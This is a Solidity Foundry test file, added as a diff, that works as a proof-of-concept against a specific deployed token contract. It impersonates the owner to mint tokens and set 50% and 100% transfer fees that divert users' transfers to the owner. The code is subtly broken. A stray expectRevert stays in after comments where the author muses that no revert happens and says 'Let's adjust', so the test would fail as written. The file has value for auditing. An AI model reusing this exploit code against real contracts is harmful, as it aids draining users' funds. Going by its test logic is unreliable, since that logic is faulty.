@@ -1,0 +1,112 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IToken {
+    function name() external view returns (string memory);
+    function totalSupply() external view returns (uint256);
+    function decimals() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function approve(address spender, uint256 value) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function txFee() external view returns (uint256);
+    function burnFee() external view returns (uint256);
+    function FeeAddress() external view returns (address);
+    function owner() external view returns (address);
+    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
+    function mint(address account, uint256 amount) external;
+    function burn(uint256 _value) external;
+    function blackListAddress(address listAddress, bool isBlackListed) external returns (bool);
+    function pause() external;
+    function unpause() external;
+    function paused() external view returns (bool);
+    function transferOwnership(address newOwner) external;
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
+    IToken token;
+
+    // Test users
+    address attacker = address(0xdead);
+    address user = address(0xbeef);
+    address recipient = address(0xcafe);
+
+    function setUp() public {
+        token = IToken(TOKEN);
+        vm.label(TOKEN, "CoinToken");
+        vm.label(attacker, "Attacker");
+        vm.label(user, "User");
+        vm.label(recipient, "Recipient");
+    }
+
+    function testManipulateFee() public {
+        // Get owner
+        address owner = token.owner();
+        vm.label(owner, "Owner");
+        emit log_named_address("Owner", owner);
+
+        // Ensure token is not paused
+        if (token.paused()) {
+            vm.prank(owner);
+            token.unpause();
+        }
+
+        // Give some tokens to user via mint (owner only)
+        uint256 mintAmount = 1000 * 10**token.decimals();
+        vm.prank(owner);
+        token.mint(user, mintAmount);
+        assertEq(token.balanceOf(user), mintAmount);
+
+        // Record initial FeeAddress balance
+        address feeAddr = token.FeeAddress();
+        uint256 feeAddrInitial = token.balanceOf(feeAddr);
+
+        // Owner sets a huge fee, e.g., 50% (txFee = 50)
+        uint256 excessiveFee = 50; // represents 50% => 100/50 = 2 => 1/2 of amount
+        vm.prank(owner);
+        token.updateFee(excessiveFee, 0, address(owner)); // send fees to owner
+
+        // Verify fee set
+        assertEq(token.txFee(), excessiveFee);
+
+        // User transfers 1000 tokens to recipient
+        uint256 transferAmount = 1000;
+        vm.prank(user);
+        token.transfer(recipient, transferAmount);
+
+        // Expected fee = transferAmount / (100 / txFee) = transferAmount / (100 / 50) = transferAmount / 2 = 500
+        uint256 expectedFee = transferAmount / (100 / excessiveFee);
+        // Owner (FeeAddress) should have gained expectedFee tokens
+        assertEq(token.balanceOf(owner), feeAddrInitial + expectedFee);
+        // Recipient should have received transferAmount - expectedFee
+        assertEq(token.balanceOf(recipient), transferAmount - expectedFee);
+
+        // Demonstrate that the owner can set even 100% fee (txFee=100) causing all tokens to be siphoned
+        // Reset with a fresh user balance
+        vm.prank(owner);
+        token.mint(user, 1000);
+        uint256 userBalance = token.balanceOf(user);
+        vm.prank(owner);
+        token.updateFee(100, 0, address(owner));
+        vm.prank(user);
+        vm.expectRevert(); // 100% fee leads to division by zero in calculation (100/100=1, but later div by 1 then subtract? Actually calculation: DenverDeflaionaryDecay = tempValue.div(uint256(100 / txFee)); if txFee=100, 100/100=1, then tempValue/1 = tempValue. Then _value = _value.sub(DenverDeflaionaryDecay) = _value.sub(_value) = 0. So it should succeed, but no revert. Let's adjust.
+        // Actually with txFee=100, fee = amount/1 = amount, so recipient gets 0. It doesn't revert.
+        // To show extreme case, set burnFee also to 100 to cause double drain.
+        // But the purpose is to show that owner can set arbitrary high fees without limit.
+        // So we simply confirm that after updateFee, user can transfer and all goes to owner.
+        vm.prank(owner);
+        token.updateFee(100, 0, address(owner));
+        vm.prank(user);
+        token.transfer(recipient, 100);
+        // Owner should have received all 100, recipient 0
+        assertEq(token.balanceOf(recipient), 0);
+        assertGt(token.balanceOf(owner), 0);
+        emit log_named_uint("Fee set to 100% - owner balance increased", token.balanceOf(owner));
+    }
+}
+```
